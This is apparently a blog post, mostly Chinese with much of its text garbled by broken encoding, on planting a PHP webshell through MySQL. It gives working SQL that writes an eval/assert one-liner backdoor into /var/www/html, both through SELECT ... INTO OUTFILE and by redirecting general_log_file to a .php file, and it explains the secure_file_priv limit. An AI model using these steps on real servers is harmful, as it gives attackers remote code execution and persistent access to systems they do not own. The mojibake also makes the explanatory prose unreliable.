---
layout: post
title: MySQL��ȡWebshell
categories: [��ȫ, MySQL, Webshell]
description: MySQL��ȡWebshell
keywords: ��ȫ, MySQL, webshell
---

## MySQL��ȡWebshell
### 1.select ... into outfile
��MySQL���ݿ�û�����õ��뵼��Ȩ�޵�ʱ�����ǿ���ͨ��select ... into outfile��ȡwebshell�����MySQL������Ȩ�޼��ߣ���ô����ͨ��MySQL�ϴ���webshellҲ������Ӧ��Ȩ�ޣ���������ֱ����ӹ���Ա�˻�������һ�����£�
1. ���ҿɶ�дĿ¼
2. ͨ��select ... into outfile��ȡwebshell

select ... into outfile�����¼��ַ�ʽ��
```sql
select "<?php @eval($_POST[b]);?>" into outfile "/var/www/html/webshell.php";
```
```sql
create table webshell(a blog);
insert into webshell(a) value("<?php @eval($_POST[b]);?>");
select a from webshell into outfile "/var/www/html/webshell.php";
```
### 2.ͨ��general_logѡ���ȡwebshell
1. ֱ�ӵ���webshellʧ��
��ʱ��ͨ��select into outfile�ȷ���ֱ�ӵ���webshell��ʧ�ܣ���ʾ������Ϣ���£�
```sql
The MySQL server is ruuning with the --secure-fie-priv option so it cannot execute this statement
```
��˼��Mysql����������"--secure-file-privѡ����Բ���ִ�������䡣
2. secure_file_privѡ��
��Mysql��ʹ��secure_file_priv����������ɶ����ݵ��뵼�������ƣ�ǰ���webshell����������ˡ���Mysql�ٷ�������"--secure-file-priv=name limit LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE() to file within specified directory"���ͣ����Ƶ��뵼���ļ���ָ����Ŀ¼��������÷����£�
- ����mysqld�������뵼��
```sql
mysqld --secure_file_priv=null
```
- ����mysqld�ĵ���͵���ֻ�ܷ�����/tmp/Ŀ¼��
```sql
mysqld --secure_file_priv=/tmp/
```
- ����mysqld�ĵ���͵��������ƣ���/etc/my.cnf�ļ��в�ָ��ֵ

3. ͨ��general_log��general_log_file����ȡwebshell
mysql��general_log�����еĲ�ѯ��䶼������general_log�ļ����Կɶ��ķ�ʽ�õ���Ҳ����˵��general_log_file���¼���еĲ�ѯ��䣬��ԭʼ��״̬����ʾ�������general_log���ش򿪣�general_log_file����Ϊһ��php�ļ������ѯ�Ĳ�������ȫ��д�뵽general_log_fileָ�����ļ��У�ͨ������general_log_fileָ�����ļ�����ȡwebshell��ע�⣺general_log_file����Ŀ¼һ��Ҫ�߱���дȨ�ޣ�ͬʱ��Ŀ¼Ӧ����web�������ܸ��ǵķ�Χ֮�ڣ�����������ִ�в������£�
```sql
set global general_log='on';
set global general_log_file='/var/www/html/webshell.php';
select '<?php assert($_POST['pass']);?>';
```